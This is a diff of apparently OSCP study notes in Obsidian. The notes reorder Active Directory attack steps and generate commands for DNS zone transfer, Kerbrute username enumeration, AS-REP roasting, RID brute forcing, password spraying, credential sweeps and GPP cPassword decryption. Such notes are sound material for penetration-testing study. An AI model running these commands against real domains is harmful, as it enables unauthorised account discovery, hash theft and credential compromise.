@@ -7,6 +7,121 @@ const command = `ldapsearch -x -h ${ip} -s base namingcontexts`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+Add hosts to /etc/hosts 
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `echo "${ip} ${discoveredDomain}" | sudo tee -a /etc/hosts`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+---
+## Port 53 : DNS
+
+## DNS Zone Transfer
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `dig axfr ${ip} ${discoveredDomain}`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+---
+
+## Port 88 : Kerberos
+
+## No creds at all : Kerbrute force usernames
+
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `kerbrute userenum -d ${discoveredDomain} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc ${ip}`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+---
+
+## Only User Obtained : Check Pre-Auth As-rep Kerberoasting
+
+### Why Scan for Pre-Authentication?
+
+Normally, Kerberos uses **Pre-Authentication** to prevent password guessing:
+
+1. When a user requests a ticket (AS-REQ), Kerberos requires them to encrypt the current timestamp using a key derived from their password.
+    
+2. The Domain Controller (DC) decrypts it. If correct, the DC knows the user has the password and issues a Ticket Granting Ticket (TGT).
+    
+
+However, if an account has the setting **"Do not require Kerberos pre-authentication"** (`DONT_REQ_PREAUTH`) enabled in Active Directory:
+
+- Anyone can send an AS-REQ to the DC asking for an authentication ticket on behalf of that username.
+    
+- Because pre-authentication is turned off, the DC **immediately sends back an AS-REP response** containing an encrypted ticket payload.
+    
+- That payload is encrypted with the target user's password hash.
+
+The AS-REP (Authentication Server Response) is an encrypted Kerberos Ticket-Granting Ticket (TGT) for a user account whose Kerberos pre-authentication is disabled.
+
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `impacket-GetNPUsers -request -usersfile Users.txt ${discoveredDomain}/ -dc-ip ${ip}`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+---
+
+## Only PW, looking for Users : looksupid
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = ` nxc smb ${ip} -u 'asdf' -p '' --rid-brute`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+![[Pasted image 20260910111923.png]]
+
+Add these usernames into user_list
+### password spray  
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `nxc smb ${ip} -u [userlist] -p [pw] --continue-on-success | grep '[+]'`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+---
+
+## Both User and PW Obtained : NetExec Credential Usage Sweep
+
+Upon Entry, Once Creds for unknown usage is obtained, use [[NetExec]]to check across all services, nxc-sweep is used to automatically check all services
+
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `cd ~/Desktop/Tools/Windows && ./nxc-sweep ${ip} -u '[USER]' -p '[PASSWORD]'`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+In NetExec (and its predecessor CrackMapExec), seeing (Pwn3d!) next to a set of credentials means that the provided username and password are valid and possess administrative or code execution privileges on that target
+
+[[5985 5986 WinRM]]
+[[Synced OSCP Notes/Small Toolkit/Tools/Evil-Winrm|Evil-Winrm]]
+
+---
+
 ## NMAP Vuln Script Scan
 
 #### TCP
@@ -46,77 +161,7 @@ Try to ping yourself with a listener opener, the printer might try to authentica
 Then try LDAP dump. There might be password and username
 
 ---
-## Only User Obtained : Check Pre-Auth As-rep Kerberoasting
 
-### Why Scan for Pre-Authentication?
-
-Normally, Kerberos uses **Pre-Authentication** to prevent password guessing:
-
-1. When a user requests a ticket (AS-REQ), Kerberos requires them to encrypt the current timestamp using a key derived from their password.
-    
-2. The Domain Controller (DC) decrypts it. If correct, the DC knows the user has the password and issues a Ticket Granting Ticket (TGT).
-    
-
-However, if an account has the setting **"Do not require Kerberos pre-authentication"** (`DONT_REQ_PREAUTH`) enabled in Active Directory:
-
-- Anyone can send an AS-REQ to the DC asking for an authentication ticket on behalf of that username.
-    
-- Because pre-authentication is turned off, the DC **immediately sends back an AS-REP response** containing an encrypted ticket payload.
-    
-- That payload is encrypted with the target user's password hash.
-
-The AS-REP (Authentication Server Response) is an encrypted Kerberos Ticket-Granting Ticket (TGT) for a user account whose Kerberos pre-authentication is disabled.
-
-```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Machine");
-const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";const ip = page?.IP ?? "NO IP FOUND";
-
-const command = `impacket-GetNPUsers -request -usersfile Users.txt ${discoveredDomain}/ -dc-ip ${ip}`;
-
-dv.paragraph("```bash\n" + command + "\n```");
-```
-
----
-
-## Both User and PW Obtained : NetExec Credential Usage Sweep
-
-Upon Entry, Once Creds for unknown usage is obtained, use [[NetExec]]to check across all services, nxc-sweep is used to automatically check all services
-
-```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
-
-const command = `cd ~/Desktop/Tools/Windows && ./nxc-sweep ${ip} -u '[USER]' -p '[PASSWORD]'`;
-
-dv.paragraph("```bash\n" + command + "\n```");
-```
-
-In NetExec (and its predecessor CrackMapExec), seeing (Pwn3d!) next to a set of credentials means that the provided username and password are valid and possess administrative or code execution privileges on that target
-
-[[5985 5986 WinRM]]
-
----
-
-## Only PW, looking for Users : looksupid
-```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
-
-const command = ` nxc smb ${ip} -u 'asdf' -p '' --rid-brute`;
-
-dv.paragraph("```bash\n" + command + "\n```");
-```
-![[Pasted image 20260910111923.png]]
-
-Add these usernames into user_list
-### password spray  
-```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
-
-const command = `nxc smb ${ip} -u [userlist] -p [pw] --continue-on-success | grep '[+]'`;
-
-dv.paragraph("```bash\n" + command + "\n```");
-```
-
----
 # cPassword
 
 we can use `gpp-decrypt` which uses AES-256 key to decrypt the data. `gpp-decrypt` is a utility specifically designed to decrypt the `cPassword` (or "cipher-password") attribute found in Group Policy Preferences (GPP) XML files on a Windows domain.
